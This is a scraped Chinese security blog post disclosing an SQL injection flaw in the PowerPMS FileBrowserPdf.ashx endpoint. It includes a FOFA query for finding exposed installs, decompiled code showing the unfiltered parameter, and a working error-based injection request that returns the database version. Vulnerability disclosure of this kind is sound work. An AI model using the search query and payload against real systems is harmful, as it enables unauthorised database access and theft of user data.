---
title: "普华Powerpms FileBrowserPdf.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/powerpms-Control-FileBrowserPdf-sqli-2.html
asset_dir: assets/普华powerpms-filebrowserpdf.ashx-sql注入漏洞
---

# 普华Powerpms FileBrowserPdf.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/23 08:16
- 1017浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

SQL

软件

数据库

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统FileBrowserPdf.ashx接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

看下FileBrowserPdf.ashx的实现逻辑

```
public class FileBrowserPdf : IHttpHandler
{
  public void ProcessRequest(HttpContext context)
  {
    string fileId = RequestHelper.GetString("_fileid");
    if (!string.op_Inequality(RequestHelper.GetString("istest"), "1") || string.IsNullOrEmpty(fileId))
      return;
    BrowserPdfCahe.BrowserPdf(context, fileId, true);
  }
```

当 \_fileid 参数不为空时，进入BrowserPdfCahe.BrowserPdf

代码安全审计

深入探索

传输层安全性协议

计算机安全

Web安全书籍

```
public static void BrowserPdf(HttpContext context, string fileId, bool IsFragmentation)
{
  ViewResultModel viewResultModel = ViewResultModel.Create(true, "");
  try
  {
    bool flag = true;
    string libCfg = EntityFilesLibHelper.GetLibCfg(EntityFilesLibHelper.GetLibIdByCode(context, "FormMess"), "ToPdfPath");
    if (!string.op_Inequality(libCfg, ""))
      return;
    IBaseBusiness byKey = BusinessFactory.CreateBusinessOperate("DocFile").FindByKey((object) fileId);
```

使用FindByKey来查找，这个属于老熟人了。使用FindByKey查找，无过滤或校验，因此造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，就是朴实无华。

# 漏洞复现

```
POST /PowerPlat/Control/FileBrowserPdf.ashx HTTP/1.1
Host: powerpms.mrxn.net

_fileid=1'and 1<@@VERSION--
```

[![普华Powerpms FileBrowserPdf.ashx SQL注入漏洞](images/img-001-c0189a62995d.webp)](https://image.mrxn.net/2dbe8e11a69e4094aee6ec7d530210db.webp)

通过报错注入成功在响应回显数据库版本信息

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
